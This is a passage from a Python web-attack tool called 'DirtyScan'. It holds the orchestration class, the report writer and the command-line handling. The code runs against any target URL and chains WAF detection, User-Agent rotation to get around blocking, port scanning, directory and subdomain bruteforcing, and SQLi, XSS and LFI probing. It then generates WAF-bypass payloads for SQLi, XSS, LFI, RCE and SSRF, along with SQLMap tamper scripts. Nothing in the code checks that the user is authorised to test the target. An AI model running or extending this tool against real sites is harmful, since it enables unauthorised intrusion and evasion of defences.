                        self.found.append({"software": f"{software}/{version}", "cve": cve})

        return list({v["cve"]: v for v in self.found}.values())


# ============================================================
# MAIN SCANNER ENGINE
# ============================================================

class DirtyScan:
    def __init__(self, target_url):
        self.target_url = target_url.rstrip("/")
        parsed = urllib.parse.urlparse(target_url)
        self.target_host = parsed.netloc.split(":")[0]
        self.target_domain = ".".join(self.target_host.split(".")[-2:]) if len(self.target_host.split(".")) >= 2 else self.target_host
        self.scheme = parsed.scheme
        self.results = {}
        self.bypass_active = False

    def log(self, msg, color=Fore.CYAN):
        print(f"{color}[{datetime.now().strftime('%H:%M:%S')}] {msg}{Style.RESET_ALL}")

    def good(self, msg):
        print(f"{Fore.GREEN}[+] {msg}{Style.RESET_ALL}")

    def warn(self, msg):
        print(f"{Fore.YELLOW}[!] {msg}{Style.RESET_ALL}")

    def bad(self, msg):
        print(f"{Fore.RED}[-] {msg}{Style.RESET_ALL}")

    def section(self, title):
        print()
        self.log(f"{'='*60}", Fore.BLUE)
        self.log(f"  {title}", Fore.BLUE)
        self.log(f"{'='*60}", Fore.BLUE)
        print()

    def check_blocked(self, url=None):
        try:
            r = requests.get(url or self.target_url, headers={"User-Agent": get_random_user_agent()},
                             timeout=10, verify=False)
            if r.status_code in [403, 429, 503] or len(r.text) < 100:
                return True
            return False
        except:
            return True

    def handle_block(self):
        if not self.check_blocked():
            return True
        self.warn("Request blocked! Rotating User-Agents...")
        for i in range(10):
            ua = rotate_user_agent()
            self.log(f"Trying UA #{CURRENT_UA_INDEX}: {ua[:40]}...")
            try:
                r = requests.get(self.target_url, headers={"User-Agent": ua},
                                 timeout=10, verify=False)
                if r.status_code == 200 and len(r.text) > 200:
                    self.good(f"User-Agent #{CURRENT_UA_INDEX} works!")
                    return True
            except:
                pass
            time.sleep(1)
        self.bad("All User-Agents blocked. May be IP-based blocking.")
        return False

    # PHASE 1: WAF Detection
    def phase_waf(self):
        self.section("PHASE 1: WAF DETECTION")
        self.log("Detecting Web Application Firewall...")
        detector = WAFDetector(self.target_url)
        wafs, is_blocked = detector.detect()

        if wafs:
            self.good(f"WAF Detected: {len(wafs)} WAF(s) found")
            for name, conf in wafs:
                bar = "#" * (conf // 10) + "-" * (10 - conf // 10)
                self.good(f"  {Fore.CYAN}{name}{Fore.GREEN}: [{bar}] {conf}%")
            self.results["waf"] = {"detected": True, "list": wafs}
            if is_blocked or any(c > 50 for _, c in wafs):
                self.warn("WAF actively blocking - activating bypass mode")
                self.bypass_active = True
        else:
            self.good("No WAF detected")
            self.results["waf"] = {"detected": False}

        return wafs, is_blocked

    # PHASE 1b: Block Detection
    def phase_block(self):
        if not self.check_blocked():
            return True
        self.section("PHASE 1b: BLOCK DETECTION & UA ROTATION")
        return self.handle_block()

    # PHASE 2: Port Scan
    def phase_ports(self, custom_ports=None):
        self.section("PHASE 2: PORT SCANNING")
        self.log(f"Scanning {self.target_host}...")
        scanner = PortScanner(self.target_host, ports=custom_ports)
        ports = scanner.scan()
        if ports:
            self.good(f"Found {len(ports)} open ports:")
            for p, s, b in ports[:30]:
                self.good(f"  {p:>5}/{s:<12} | {b[:60] if b else ''}")
            if len(ports) > 30:
                self.log(f"  ... and {len(ports) - 30} more")
        else:
            self.log("No common ports open")
        self.results["ports"] = ports
        return ports

    # PHASE 3: Tech Fingerprinting + Headers
    def phase_tech(self):
        self.section("PHASE 3: TECHNOLOGY FINGERPRINTING")
        self.log("Identifying technologies...")
        fp = TechFingerprinter(self.target_url)
        tech = fp.fingerprint()
        if tech:
            self.good("Technologies detected:")
            for k, v in tech.items():
                self.good(f"  {k}: {v}")
        self.results["tech"] = tech

        # Headers
        self.log("Analyzing security headers...")
        ha = HeaderAnalyzer(self.target_url)
        headers = ha.analyze()
        if headers.get("missing"):
            self.warn(f"Missing security headers: {len(headers['missing'])}")
            for m in headers["missing"][:10]:
                self.warn(f"  {m}")
        if headers.get("cookie_issues"):
            self.warn(f"Cookie issues: {headers['cookie_issues']}")
        if headers.get("cors"):
            self.log(f"CORS origin: {headers['cors']}")
        self.results["headers"] = headers
        return tech, headers

    # PHASE 4: Web Crawl
    def phase_crawl(self, max_pages=30):
        self.section("PHASE 4: WEB CRAWLING")
        self.log(f"Crawling (max {max_pages} pages)...")
        crawler = WebCrawler(self.target_url, max_pages=max_pages)
        crawl = crawler.crawl()

        self.good(f"Pages crawled: {crawl['total_crawled']}")
        self.good(f"Forms found: {len(crawl['forms'])}")
        self.good(f"JS files: {len(crawl['js_files'])}")
        self.good(f"Emails found: {len(crawl['emails'])}")
        if crawl['emails']:
            for e in crawl['emails'][:10]:
                self.good(f"  {e}")
        if crawl['api_endpoints']:
            self.good(f"API endpoints: {len(crawl['api_endpoints'])}")
            for a in crawl['api_endpoints'][:10]:
                self.good(f"  {a}")
        if crawl['comments']:
            self.warn(f"HTML comments found: {len(crawl['comments'])}")

        self.results["crawl"] = crawl
        return crawl

    # PHASE 5: Directory Bruteforce
    def phase_dirs(self):
        self.section("PHASE 5: DIRECTORY BRUTEFORCE")
        self.log("Bruteforcing common paths...")
        bruteforcer = DirectoryBruteforcer(self.target_url)
        dirs = bruteforcer.scan()

        interesting = [d for d in dirs if d[1] in [200, 401, 403, 301, 302]]
        if interesting:
            self.good(f"Found {len(interesting)} interesting paths:")
            for path, code, size in interesting[:20]:
                color = Fore.GREEN if code == 200 else Fore.YELLOW
                self.good(f"  {color}/{path:<30} [{code}] ({size} bytes){Fore.GREEN}")
        else:
            self.log("No interesting paths found")

        self.results["directories"] = interesting
        return dirs

    # PHASE 6: DNS Enumeration
    def phase_dns(self):
        self.section("PHASE 6: DNS ENUMERATION")
        self.log(f"Enumerating DNS records for {self.target_domain}...")
        try:
            import dns.resolver
            enumerator = DNSEnumerator(self.target_domain)
            records = enumerator.enumerate_records()
            if records:
                self.good("DNS records found:")
                for rtype, values in records.items():
                    for v in values[:5]:
                        self.good(f"  {rtype:<5}: {v}")
            else:
                self.log("No DNS records found")

            self.log("Bruteforcing subdomains...")
            subs = enumerator.brute_subdomains()
            if subs:
                self.good(f"Subdomains found: {len(subs)}")
                for sub, ips in subs[:20]:
                    self.good(f"  {sub:<40} -> {', '.join(ips)}")
            else:
                self.log("No subdomains found via bruteforce")

            self.results["dns"] = {"records": records, "subdomains": subs}
        except ImportError:
            self.warn("dnspython not installed. Skipping DNS enumeration.")
            self.log("Install: pip install dnspython")

    # PHASE 7: SSL/TLS Check
    def phase_ssl(self):
        if self.scheme != "https":
            self.log("Target is HTTP, skipping SSL/TLS check")
            return
        self.section("PHASE 7: SSL/TLS CHECK")
        self.log(f"Checking SSL/TLS on {self.target_host}:443...")
        checker = SSLChecker(self.target_host)
        ssl_info = checker.check()

        if "error" in ssl_info:
            self.warn(f"SSL check error: {ssl_info['error']}")
        else:
            version = ssl_info.get("version", "N/A")
            cipher = ssl_info.get("cipher", "N/A")
            san = ssl_info.get("san", [])
            expiry = ssl_info.get("not_after", "N/A")

            self.good(f"TLS version: {version}")
            self.good(f"Cipher: {cipher}")
            self.good(f"Certificate valid until: {expiry}")
            if san:
                self.good(f"SAN entries: {len(san)} domains")

            # Check weak protocols
            weak = []
            if ssl_info.get("ssl_v2_supported"):
                weak.append("SSLv2")
            if ssl_info.get("ssl_v3_supported"):
                weak.append("SSLv3")
            if ssl_info.get("tls_v1_0_supported"):
                weak.append("TLSv1.0")
            if ssl_info.get("tls_v1_1_supported"):
                weak.append("TLSv1.1")
            if weak:
                self.warn(f"Weak protocols enabled: {', '.join(weak)}")

        self.results["ssl"] = ssl_info

    # PHASE 8: Vulnerability Scan
    def phase_vulns(self):
        self.section("PHASE 8: VULNERABILITY SCANNING")
        self.log("Testing for SQLi, XSS, LFI...")
        detector = VulnerabilityDetector(self.target_url)
        vulns = detector.run_all()

        if vulns["sqli"]["count"] > 0:
            self.warn(f"SQL Injection: {vulns['sqli']['count']} potential")
            for v in vulns["sqli"]["details"]:
                self.warn(f"  Type: {v['type']} | {v['payload'][:50]}")
        else:
            self.log("No obvious SQL injection detected")

        if vulns["xss"]["count"] > 0:
            self.warn(f"XSS: {vulns['xss']['count']} potential")
            for v in vulns["xss"]["details"]:
                self.warn(f"  Payload: {v['payload'][:50]}")
        else:
            self.log("No obvious XSS detected")

        if vulns["lfi"]["count"] > 0:
            self.warn(f"LFI: {vulns['lfi']['count']} potential")
            for v in vulns["lfi"]["details"]:
                self.warn(f"  Payload: {v['payload']}")

        self.results["vulns"] = vulns
        return vulns

    # PHASE 9: WAF Bypass Generation
    def phase_bypass(self):
        self.section("PHASE 9: WAF BYPASS GENERATION")
        if not self.bypass_active and not self.results.get("waf", {}).get("detected"):
            self.log("No WAF detected, bypass not needed")
            return

        self.log("Generating bypass payloads...")
        bypass = WAFBypass(self.target_url)
        payloads = bypass.generate_payloads()

        self.good(f"SQLi bypass payloads: {len(payloads['sqli'])}")
        self.good(f"XSS bypass payloads: {len(payloads['xss'])}")
        self.good(f"LFI bypass payloads: {len(payloads['lfi'])}")
        self.good(f"RCE bypass payloads: {len(payloads['rce'])}")
        self.good(f"SSRF bypass payloads: {len(payloads['ssrf'])}")
        self.good(f"Header bypasses: {len(payloads['headers'])}")
        self.good(f"SQLMap tamper scripts: {len(bypass.tamper_scripts)}")

        self.log("Sample SQLi bypasses:")
        for p in payloads["sqli"][:10]:
            self.log(f"  {p}")
        self.log("Sample header bypasses:")
        for h in payloads["headers"][:5]:
            self.log(f"  {list(h.keys())[0]}: {list(h.values())[0]}")

        self.results["bypass"] = {
            "sqli_count": len(payloads["sqli"]),
            "xss_count": len(payloads["xss"]),
            "tampers": bypass.tamper_scripts,
            "samples": payloads["sqli"][:5]
        }

    # PHASE 10: CVE Check
    def phase_cve(self):
        self.section("PHASE 10: CVE CHECK")
        banners = []
        versions = {}
        for port, service, banner in self.results.get("ports", []):
            if service:
                versions[service] = str(port)
            if banner:
                banners.append(banner)
        tech = self.results.get("tech", {})
        for k, v in tech.items():
            versions[k] = str(v)

        checker = CVEChecker(banners, versions)
        cves = checker.check()
        if cves:
            self.warn(f"Potential CVEs: {len(cves)}")
            for c in cves[:15]:
                self.warn(f"  {c['software']:<25} -> {c['cve']}")
        else:
            self.log("No known CVEs matched banners")

        self.results["cves"] = cves

    # RUN ALL
    def run(self, options=None):
        print(Fore.RED + BANNER + Style.RESET_ALL)

        self.section("TARGET INFO")
        self.log(f"URL: {self.target_url}")
        self.log(f"Host: {self.target_host}")
        self.log(f"Domain: {self.target_domain}")
        self.log(f"Time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")

        options = options or {}

        # Phase 1: WAF
        if not options.get("no_waf"):
            wafs, blocked = self.phase_waf()
            if blocked or self.check_blocked():
                if not self.phase_block():
                    self.bad("Cannot continue - target blocking requests")
                    self.save_report()
                    return self.results

        # Phase 2: Ports
        if not options.get("no_ports"):
            self.phase_ports(options.get("ports"))

        # Phase 3: Tech
        if not options.get("no_tech"):
            self.phase_tech()

        # Phase 4: Crawl
        if not options.get("no_crawl"):
            self.phase_crawl(options.get("max_crawl", 30))

        # Phase 5: Dirs
        if not options.get("no_dirs"):
            self.phase_dirs()

        # Phase 6: DNS
        if not options.get("no_dns"):
            self.phase_dns()

        # Phase 7: SSL
        if not options.get("no_ssl"):
            self.phase_ssl()

        # Phase 8: Vulns
        if not options.get("no_vulns"):
            self.phase_vulns()

        # Phase 9: Bypass
        if not options.get("no_bypass"):
            self.phase_bypass()

        # Phase 10: CVE
        if not options.get("no_cve"):
            self.phase_cve()

        # Summary
        self.section("SCAN COMPLETE")
        self.print_summary()
        self.save_report()
        return self.results

    def print_summary(self):
        self.good("=" * 60)
        self.good(f"Target: {self.target_url}")
        waf = self.results.get("waf", {})
        if waf.get("detected"):
            self.warn(f"WAF: Yes ({', '.join([n for n,c in waf.get('list', [])[:3]])})")
        else:
            self.good("WAF: No")

        ports = self.results.get("ports", [])
        self.good(f"Open Ports: {len(ports)}")
        crawl = self.results.get("crawl", {})
        self.good(f"Crawled: {crawl.get('total_crawled', 0)} pages, {len(crawl.get('forms', []))} forms")
        vulns = self.results.get("vulns", {})
        self.good(f"SQLi: {vulns.get('sqli', {}).get('count', 0)}, XSS: {vulns.get('xss', {}).get('count', 0)}, LFI: {vulns.get('lfi', {}).get('count', 0)}")
        cves = self.results.get("cves", [])
        if cves:
            self.warn(f"CVE matches: {len(cves)}")
        dirs = self.results.get("directories", [])
        self.good(f"Interesting paths: {len([d for d in dirs if d[1] in [200,401,403]])}")
        self.good("=" * 60)

    def save_report(self):
        host = self.target_host
        ts = datetime.now().strftime("%Y%m%d_%H%M%S")
        txt = f"dirtyscan_{host}_{ts}.txt"
        jsn = f"dirtyscan_{host}_{ts}.json"

        try:
            with open(txt, "w") as f:
                f.write("=" * 70 + "\n")
                f.write("  Dirty Scan - Web Security Scanner\n")
                f.write("  Created by Strozzz\n")
                f.write("=" * 70 + "\n\n")
                f.write(f"Target: {self.target_url}\n")
                f.write(f"Date: {datetime.now()}\n\n")

                f.write("--- WAF ---\n")
                waf = self.results.get("waf", {})
                if waf.get("detected"):
                    for n, c in waf.get("list", []):
                        f.write(f"  {n}: {c}%\n")
                else:
                    f.write("  None detected\n")

                f.write("\n--- Open Ports ---\n")
                for p, s, b in self.results.get("ports", []):
                    f.write(f"  {p}/{s}\n")

                f.write("\n--- Technologies ---\n")
                for k, v in self.results.get("tech", {}).items():
                    f.write(f"  {k}: {v}\n")

                f.write("\n--- Missing Security Headers ---\n")
                h = self.results.get("headers", {})
                for m in h.get("missing", []):
                    f.write(f"  {m}\n")

                f.write("\n--- Crawl ---\n")
                c = self.results.get("crawl", {})
                f.write(f"  Pages: {c.get('total_crawled', 0)}\n")
                f.write(f"  Forms: {len(c.get('forms', []))}\n")
                f.write(f"  Emails: {len(c.get('emails', []))}\n")

                f.write("\n--- Vulnerabilities ---\n")
                v = self.results.get("vulns", {})
                f.write(f"  SQLi: {v.get('sqli', {}).get('count', 0)}\n")
                f.write(f"  XSS: {v.get('xss', {}).get('count', 0)}\n")
                f.write(f"  LFI: {v.get('lfi', {}).get('count', 0)}\n")

                f.write("\n--- CVEs ---\n")
                for cve in self.results.get("cves", []):
                    f.write(f"  {cve['software']}: {cve['cve']}\n")

            with open(jsn, "w") as f:
                json.dump(self.results, f, indent=2, default=str)

            self.good(f"Reports saved: {txt}, {jsn}")
        except Exception as e:
            self.bad(f"Report save failed: {e}")


# ============================================================
# HELP
# ============================================================

def print_help():
    help_txt = """
DIRTY SCAN - Web Security Scanner | Created by Strozzz

USAGE:
  python3 dirtyscan.py <url> [options]

COMMON EXAMPLES:
  python3 dirtyscan.py https://example.com
  python3 dirtyscan.py https://example.com/page.php?id=1
  python3 dirtyscan.py http://target.com --ports 80,443,8080 --crawl 100

OPTIONS:
  --ports      Custom ports for scanning (comma separated)
  --crawl      Max pages to crawl (default: 30)
  --no-waf     Skip WAF detection
  --no-ports   Skip port scanning
  --no-tech    Skip technology fingerprinting
  --no-crawl   Skip web crawling
  --no-dirs    Skip directory bruteforce
  --no-dns     Skip DNS enumeration
  --no-ssl     Skip SSL/TLS check
  --no-vulns   Skip vulnerability scanning
  --no-cve     Skip CVE matching
  --no-bypass  Skip WAF bypass generation
  --help       Show this help

ALL FEATURES COVERED:
  1. WAF Detection          - 35+ WAF fingerprints
  2. Auto Block Detect      - Automatic UA rotation on block
  3. 20 User Agents         - Browser, OS, mobile rotation
  4. Port Scanner           - 200+ ports with service & banner
  5. Tech Fingerprinting    - Server, CMS, JS libs, analytics
  6. Header Analysis        - Security headers, CORS, cookies
  7. Web Crawler            - Links, forms, JS, emails, APIs
  8. Directory Bruteforce   - 150+ common paths
  9. DNS Enumeration        - Records + subdomain bruteforce
  10. SSL/TLS Check         - Version, cipher, weak protocols
  11. Vuln Scanner          - SQLi, XSS, LFI detection
  12. WAF Bypass            - 25+ SQLi/XSS/LFI/RCE bypasses
  13. CVE Check             - Banner-based vulnerability match
  14. Reports               - TXT + JSON output
"""
    print(Fore.RED + BANNER + Style.RESET_ALL)
    print(help_txt)


# ============================================================
# MAIN
# ============================================================

def main():
    args = sys.argv[1:]
    if not args or "--help" in args or "-h" in args:
        print_help()
        sys.exit(0)

    url = args[0]
    if not url.startswith("http"):
        print(Fore.RED + "[-] URL must start with http:// or https://" + Style.RESET_ALL)
        sys.exit(1)

    opts = {}
    if "--ports" in args:
        i = args.index("--ports") + 1
        if i < len(args):
            opts["ports"] = [int(p.strip()) for p in args[i].split(",")]
    if "--crawl" in args:
        i = args.index("--crawl") + 1
        if i < len(args):
            opts["max_crawl"] = int(args[i])
    for flag in ["--no-waf", "--no-ports", "--no-tech", "--no-crawl", "--no-dirs",
                 "--no-dns", "--no-ssl", "--no-vulns", "--no-cve", "--no-bypass"]:
        if flag in args:
            opts[flag.replace("--no-", "no_")] = True

    try:
        scanner = DirtyScan(url)
        scanner.run(opts)
    except KeyboardInterrupt:
        print(f"\n{Fore.YELLOW}[!] Interrupted{Style.RESET_ALL}")
        sys.exit(0)
    except Exception as e:
        print(f"\n{Fore.RED}[-] Error: {e}{Style.RESET_ALL}")
        import traceback
        traceback.print_exc()
        sys.exit(1)


if __name__ == "__main__":
    main()
